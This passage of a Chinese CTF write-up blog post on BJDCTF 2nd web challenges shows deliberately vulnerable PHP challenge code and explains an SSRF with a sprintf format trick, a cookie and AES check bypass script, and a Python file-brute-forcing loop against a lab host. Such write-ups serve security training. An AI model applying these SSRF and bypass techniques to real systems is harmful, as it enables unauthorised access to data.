class="line"></span><br><span class="line">    $str1 = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span>.$url .<span class="string">&quot;\&quot; -M <span class="subst">$method</span> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, $method) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>home.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;禁止套娃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;现在访问的是 &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个<code>admin.php</code>，试着访问一下</p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323143502.png"></p>
+<p>好像没啥思路了，再看下<code>system.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure>
+
+<p>和极客大挑战的某题很类似，我们只需在<code>$method</code>传<code>%s%</code>将<code>%d</code>转义就行，所以我们可以这样构造</p>
+<img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200323150943.png" style="zoom:80%;">
+
+<p>可以看到我们已经ssrf读取到admin.php了，源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;爬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了看后面的随机数生成的代码，发现应该没有方法暴力破解出来</p>
+<p>仔细看看，发现如果第一次我们设置了<code>decrypt</code>，<code>$_SESSION[&#39;secret&#39;]</code>就为空，即<code>$data</code>为空</p>
+<p>而<code>Cheak()</code>函数是很好绕过的，所以我们可以构造:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5(<span class="string">&#x27;174.0.222.75&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">$cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $cipher;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323160910.png"></p>
+<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>题目有这两行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>506F2E706870</code>十六进制转字符得到<code>Po.php</code>，我哭了。。。</p>
+<p>Po是一个化学元素，刚好和题目的图相关，用化学元素跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27;, &#x27;</span>):</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://04302ff8-21bd-4bbb-86b9-401e9978d758.node3.buuoj.cn/&#123;&#125;.php&#x27;</span>.format(i))</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        print(r.text,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑完得到<code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code>，访问得到flag</p>
+<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>抓包，发现post请求得时侯一直有set_cookie，并且前几位不变</p>
+<p>base64解密得到纯数字，刚好是Unix时间戳，不懂，这样构造flag就在那个视频评论里</p>
+<p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200324174737.png"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/IOT2017/article/details/84069882">https://blog.csdn.net/IOT2017/article/details/84069882</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000015886194?utm_source=tag-newest">https://segmentfault.com/a/1190000015886194?utm_source=tag-newest</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/>http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-22T16:34:39+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年5月22日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/BJDCTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>BJDCTF</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/&title=BJDCTF 2nd writeup - 明月归的小站&summary=本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/&title=BJDCTF 2nd writeup - 明月归的小站&summary=本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/&title=BJDCTF 2nd writeup - 明月归的小站&summary=本篇博客主要介绍了第二届BJDCTF部分题目的writeup!tcl!"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>PHP反序列化之原生类</p>
+                <p class='content'>本篇博客主要介绍了php原生类反序列化的相关内容！
+
+
+基础知识先回顾一下：
+123456当对象被创建的时候调用：__construct()当对象被销毁的时候调用：__destruct()当对象...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/'>
+                <p class='title'>CTFtime做题记录<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了自己闲来无事在ctf-time做题的记录！
+
+
+Confidence CTFwebCat Web题目地址：http://catweb.zajebistyc.tf/
+查看源代码，...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84misc"><span class="toc-text">最简单的misc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Beautiful-Picture"><span class="toc-text">A_Beautiful_Picture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyBaBa"><span class="toc-text">EasyBaBa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-text">小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-EasyBaBa"><span class="toc-text">Real_EasyBaBa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A3%E7%81%AB%E6%98%AD%E6%98%AD"><span class="toc-text">圣火昭昭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TARGZ"><span class="toc-text">TARGZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%9C%BA%E6%9B%B2"><span class="toc-text">开场曲</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86"><span class="toc-text">老文盲了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-flag"><span class="toc-text">cat_flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%B5%E8%83%BD%E7%B2%BE%E9%80%9A"><span class="toc-text">灵能精通</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%87%95%E8%A8%80%E7%87%95%E8%AF%AD"><span class="toc-text">燕言燕语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Y1nglish"><span class="toc-text">Y1nglish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA0"><span class="toc-text">RSA0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA1"><span class="toc-text">RSA1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-text">假猪套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-google"><span class="toc-text">fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#old-hack"><span class="toc-text">old-hack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#duangShell"><span class="toc-text">duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E5%85%89"><span class="toc-text">xss之光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-text">简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="toc-text">文件探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#elementmaster"><span class="toc-text">elementmaster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schro%CC%88dinger"><span class="toc-text">Schrödinger</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
